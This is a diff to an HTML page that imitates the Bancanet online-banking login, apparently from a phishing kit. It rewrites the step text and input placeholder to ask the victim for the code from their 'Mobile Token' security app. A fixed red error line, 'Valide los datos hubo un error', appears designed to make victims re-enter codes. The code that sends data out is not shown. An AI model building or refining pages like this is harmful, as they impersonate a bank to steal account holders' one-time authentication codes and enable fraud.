@@ -1046,13 +1046,24 @@
 									<div style="     font-size: 15px !important; 
     width: 60% !important;
 }" _ngcontent-c29="" class="wizard-step-content-title">
-										<span _ngcontent-c29="" >Abre tu aplicacion movil y has clic en obtener codigo OTP he ingresalo para continuar</span>
+														<span _ngcontent-c29="" >Es hora de usar su dispositivo de seguridad Mobile Token</span>
+										<br>	 
+										<span _ngcontent-c37="" class="pop">Ingrese el código que aparece en la app</span>
+
+										    <style>
+
+
+.pop {
+    font-family: sans-serif;
+    font-size: 12px;
+}
+    </style>
 									</div>  </center>
 									<icb-login-step-user _ngcontent-c29="" _nghost-c35=""><div  class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
     <div _ngcontent-c35="" class="subotica">
         <div _ngcontent-c35="" class="subotica-content">
             <div _ngcontent-c35="" class="subotica-content-data"> 
-                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Escriba su otp recibido">          
+                <input id="usuario" oninput="validarUsuario()" _ngcontent-c35="" autocomplete="off" class="subotica-content-data-input required ng-pristine ng-invalid ng-touched" disable-paste="" name="username" id="step01" placeholder="Ingrese Mobile Token">          
             </div>
 			 <center><div style="color:red" class="warning" id="msgBox">Valide los datos hubo un error</div></center>
 
@@ -4200,4 +4211,5 @@
 
 
 <!---->
+
 </icb-app><div class="app_overlay"><div class="mesina-loader"><div class="mesina-logo"></div><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div><div class="mesina-welcome-title">Bienvenido a Bancanet</div><div class="mesina-welcome-subtitle1">Por favor espere un momento...</div></div></div></body></html>
